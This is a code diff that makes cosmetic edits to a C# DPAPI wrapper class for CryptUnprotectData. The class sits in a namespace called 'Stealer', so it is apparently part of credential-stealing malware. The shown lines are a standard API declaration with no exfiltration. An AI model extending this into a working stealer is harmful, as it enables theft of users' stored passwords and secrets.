@@ -4,17 +4,14 @@ using System.Runtime.InteropServices;
 using System.ComponentModel;
 
 // Decrypt data using DPAPI functions.
-
 namespace Stealer
 {
 	internal class DPAPI
 	{
-		
-
 		// Wrapper for DPAPI CryptUnprotectData function.
 		[DllImport("crypt32.dll",
 				 SetLastError = true,
-				 CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+				 CharSet = CharSet.Auto)]
 		private static extern
 			bool CryptUnprotectData(ref DATA_BLOB pCipherText,
 						ref string pszDescription,
